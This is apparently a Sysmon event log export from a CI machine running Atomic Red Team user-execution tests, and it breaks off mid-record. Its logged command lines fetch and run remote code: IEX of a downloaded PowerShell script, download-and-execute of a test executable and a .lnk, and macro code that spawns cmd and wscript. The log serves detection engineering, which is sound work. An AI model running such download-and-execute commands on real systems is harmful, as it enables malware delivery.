"12/17/2025 7:58:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:53.614
ProcessGuid: {f995aebf-62bd-6942-d003-000000000e00}
ProcessId: 1832
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_42ig4pdh.xta.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:53.594
ProcessGuid: {f995aebf-62bd-6942-d003-000000000e00}
ProcessId: 1832
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_42ig4pdh.xta.ps1
CreationUtcTime: 2025-12-17 07:58:53.594
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:53 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:53.513
ProcessGuid: {f995aebf-62bd-6942-d003-000000000e00}
ProcessId: 1832
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:53 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:51.337
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
QueryName: amtso.eicar.org
QueryStatus: 0
QueryResults: ::ffff:81.7.7.163;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:52 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:51.436
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53477
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 81.7.7.163
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http"
"12/17/2025 7:58:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:52.063
ProcessGuid: {f995aebf-62bb-6942-ce03-000000000e00}
ProcessId: 3188
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rkz2xpqw.kzk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:52 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:52.043
ProcessGuid: {f995aebf-62bb-6942-ce03-000000000e00}
ProcessId: 3188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rkz2xpqw.kzk.ps1
CreationUtcTime: 2025-12-17 07:58:52.043
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:51.961
ProcessGuid: {f995aebf-62bb-6942-ce03-000000000e00}
ProcessId: 3188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macroCode = Get-Content \""""C:\AtomicRedTeam\atomics/T1204.002/src/test9-GenericPayloadDownload.txt\"""" -Raw
$URL = \""""\"""" + \""""/\"""" + \""""\""""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\""""
Invoke-MalDoc -macroCode $macroCode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:51.717
ProcessGuid: {f995aebf-62bb-6942-cd03-000000000e00}
ProcessId: 5160
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
ParentProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ParentProcessId: 6440
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:51 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:50.303
ProcessGuid: {f995aebf-62b9-6942-c903-000000000e00}
ProcessId: 5716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53476
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:51.555
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\PotentiallyUnwanted.exe
CreationUtcTime: 2025-12-17 07:58:51.555
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:51 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:50.299
ProcessGuid: {f995aebf-62b9-6942-c903-000000000e00}
ProcessId: 5716
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:50.996
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zahuiaxx.tlx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:50.974
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zahuiaxx.tlx.ps1
CreationUtcTime: 2025-12-17 07:58:50.974
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:50.896
ProcessGuid: {f995aebf-62ba-6942-cb03-000000000e00}
ProcessId: 6440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:48.536
ProcessGuid: {f995aebf-62b8-6942-c503-000000000e00}
ProcessId: 8700
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53475
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:50 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:48.532
ProcessGuid: {f995aebf-62b8-6942-c503-000000000e00}
ProcessId: 8700
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:47.607
ProcessGuid: {f995aebf-62b7-6942-c303-000000000e00}
ProcessId: 6600
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:50.068
ProcessGuid: {f995aebf-62b9-6942-c903-000000000e00}
ProcessId: 5716
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1pgyymre.3ok.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:50.048
ProcessGuid: {f995aebf-62b9-6942-c903-000000000e00}
ProcessId: 5716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1pgyymre.3ok.ps1
CreationUtcTime: 2025-12-17 07:58:50.048
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:49.967
ProcessGuid: {f995aebf-62b9-6942-c903-000000000e00}
ProcessId: 5716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:49 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:47.611
ProcessGuid: {f995aebf-62b7-6942-c303-000000000e00}
ProcessId: 6600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53474
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:49.247
ProcessGuid: {f995aebf-62b9-6942-c703-000000000e00}
ProcessId: 9864
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bskcoxhy.n2x.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:49.226
ProcessGuid: {f995aebf-62b9-6942-c703-000000000e00}
ProcessId: 9864
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bskcoxhy.n2x.ps1
CreationUtcTime: 2025-12-17 07:58:49.226
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:49 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:46.665
ProcessGuid: {f995aebf-62b6-6942-c103-000000000e00}
ProcessId: 6660
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:48 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:46.670
ProcessGuid: {f995aebf-62b6-6942-c103-000000000e00}
ProcessId: 6660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53473
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:48.299
ProcessGuid: {f995aebf-62b8-6942-c503-000000000e00}
ProcessId: 8700
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ie05ttru.ho3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:48.279
ProcessGuid: {f995aebf-62b8-6942-c503-000000000e00}
ProcessId: 8700
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ie05ttru.ho3.ps1
CreationUtcTime: 2025-12-17 07:58:48.279
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:48 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:48.197
ProcessGuid: {f995aebf-62b8-6942-c503-000000000e00}
ProcessId: 8700
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:47.380
ProcessGuid: {f995aebf-62b7-6942-c303-000000000e00}
ProcessId: 6600
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wjkxwe2r.gux.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:47 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:47.357
ProcessGuid: {f995aebf-62b7-6942-c303-000000000e00}
ProcessId: 6600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wjkxwe2r.gux.ps1
CreationUtcTime: 2025-12-17 07:58:47.357
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:47.279
ProcessGuid: {f995aebf-62b7-6942-c303-000000000e00}
ProcessId: 6600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:45.726
ProcessGuid: {f995aebf-62b5-6942-c003-000000000e00}
ProcessId: 8200
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:44.947
ProcessGuid: {f995aebf-62b4-6942-bc03-000000000e00}
ProcessId: 8932
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:46.438
ProcessGuid: {f995aebf-62b6-6942-c103-000000000e00}
ProcessId: 6660
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4v5sfirr.yn2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:46.418
ProcessGuid: {f995aebf-62b6-6942-c103-000000000e00}
ProcessId: 6660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4v5sfirr.yn2.ps1
CreationUtcTime: 2025-12-17 07:58:46.418
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:44.952
ProcessGuid: {f995aebf-62b4-6942-bc03-000000000e00}
ProcessId: 8932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53471
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:46.337
ProcessGuid: {f995aebf-62b6-6942-c103-000000000e00}
ProcessId: 6660
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:44.712
ProcessGuid: {f995aebf-62b4-6942-bc03-000000000e00}
ProcessId: 8932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yby2yapi.05a.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:44 AM","11","File created:
RuleName: FileCreate
